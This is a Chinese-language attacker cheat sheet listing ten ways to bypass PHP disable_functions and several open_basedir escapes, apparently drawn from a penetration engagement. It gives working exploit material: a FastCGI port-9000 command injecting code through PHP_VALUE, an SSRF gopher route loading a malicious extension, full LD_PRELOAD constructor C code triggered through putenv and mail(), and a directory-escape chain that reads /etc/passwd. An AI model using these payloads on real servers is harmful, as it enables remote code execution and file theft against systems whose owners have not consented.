# PHP disable_functions 绕过全集（10 法）

> 来源：jiangxisls 全案 PHP 攻击路径图谱（2026-09-15）
> 适用：PHP 5.x–8.x + nginx/openresty + PHP-FPM 架构
> 核心认知：**`disable_functions` 禁用 exec 全家 ≠ 无法 RCE**，FastCGI/扩展加载可完全复活

## 10 条绕过路径

| # | 方法 | 条件 | 说明 |
|---|------|------|------|
| 1 | **FastCGI PHP_VALUE / PHP_ADMIN_VALUE** | 能发 FastCGI 包（9000 直连或 SSRF gopher） | 设 `auto_prepend_file=php://input` + `allow_url_include=On` → **完全 RCE，绕所有禁用** |
| 2 | **PHP_ADMIN_VALUE 加载恶意扩展** | 同上 | `extension_dir=/tmp` + `extension=evil.so` → `system` 复活 |
| 3 | **LD_PRELOAD + putenv + mail()** | mail/error_log 可用 + putenv 未禁 | 经典，PHP>=5.2.4 有补丁但配置不当仍可 |
| 4 | **FTP 被动模式打 FastCGI** | FTP 扩展 + 可写 .so | 上传 .so + FastCGI extension 加载 |
| 5 | **imap_open() RCE** | 装 imap 扩展 | `-oProxyCommand` 执行任意命令 |
| 6 | **ImageMagick / GhostScript** | 装 imagick 扩展 | 委托命令执行（MVG/EPS payload） |
| 7 | **Windows COM 对象** | Windows | `new COM('WScript.Shell')` |
| 8 | **ShellShock (CVE-2014-6271)** | CGI 模式 + bash 老版本 | 环境变量注入 |
| 9 | **未被禁的 C 调用等价物** | 视扩展 | `finfo_file` 等类绕过函数黑名单 |
| 10 | **session_id + upload_progress 写 .so** | 复杂 | 写扩展到 /tmp 后加载 |

## ★★★ 最高价值：方法 1+2（FastCGI PHP_VALUE）

**适用场景**：nginx/openresty + PHP-FPM 架构（当代 PHP 部署主流）

```
# 方法1：直连 FastCGI 9000
python3 fcgi_exp.py --host 127.0.0.1 --port 9000 \
  --php-value "auto_prepend_file=php://input" \
  --php-value "allow_url_include=On" \
  --request-body "<?php system('id');?>" \
  --script /var/www/html/index.php

# 方法2：SSRF + gopher 打 FastCGI
gopher://127.0.0.1:9000/_<FastCGI_packet>
# FastCGI 包内设置：
#   PHP_VALUE: auto_prepend_file=php://input\nallow_url_include=On
#   PHP_ADMIN_VALUE: extension_dir=/tmp\nextension=evil.so
```

**核心认知**：FastCGI PHP_VALUE 可以**覆盖几乎所有 PHP 配置**（包括 `disable_functions`），因为它不走 PHP 层面的限制，而是在 FastCGI 协议层面直接设置。

## 两条到达 FastCGI 的路径

```
路径A：9000 端口直连（外部可达）
  ↓ 条件：listen = 0.0.0.0:9000（非 Unix socket）
  ↓ 检测：nmap -p 9000 <target>
  ↓ 利用：直接发 FastCGI 包 → RCE

路径B：SSRF → gopher → FastCGI（内部）
  ↓ 条件：有 SSRF 原语 + gopher 协议可用
  ↓ 检测：找 curl_exec/file_get_contents 等可控 URL 参数
  ↓ 利用：gopher://127.0.0.1:9000/_<packet> → RCE
```

## LD_PRELOAD 绕过详解（方法 3）

```php
// evil.c → 编译为 evil.so
#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void pwn() {
    system(getenv("CMD"));
}

// PHP 侧
putenv("CMD=id > /tmp/pwned");
putenv("LD_PRELOAD=/tmp/evil.so");
mail("","","","");  // 或 error_log("x")
// mail() 内部会 fork+exec sendmail，加载 LD_PRELOAD
```

**前提**：`putenv` 未被禁用 + `mail`/`error_log` 可用

## open_basedir 绕过（配合 disable_functions 绕过后使用）

| # | 方法 | PHP 版本 | 说明 |
|---|------|---------|------|
| 1 | `glob://` + DirectoryIterator | 全版本 | 只列目录，不读文件 |
| 2 | `mkdir+chdir+ini_set('open_basedir','..')` | <8.3 | 逐级跳出 |
| 3 | `symlink()` 链路 | 全版本 | mkdir A/B/C + symlink |
| 4 | `ini_set('open_basedir', ini_get().':./../')` | <8.3 | 追加相对路径 |
| 5 | SplFileObject / finfo 类 | 全版本 | 类方法绕过函数黑名单 |

```php
// 方法2 open_basedir 逐级跳出（PHP 5.6 完全适用）
mkdir('a');chdir('a');ini_set('open_basedir','..');
chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');
echo file_get_contents('/etc/passwd');
```

## 实战教训

1. **「disable_functions 全禁」不是终点** — 9-14 轮报告写了「禁 exec 全家」就停手，实际有 10 条绕过路
2. **FastCGI 9000 必须补扫** — 很多扫描默认不含 9000，但 nginx+PHP-FPM 架构下这是最致命的端口
3. **SSRF 是打开 FastCGI 的钥匙** — 没有 9000 直连时，SSRF + gopher 是唯一路径
4. **PHP 5.6 + open_basedir=空** = 拿到任意代码执行就能读全盘
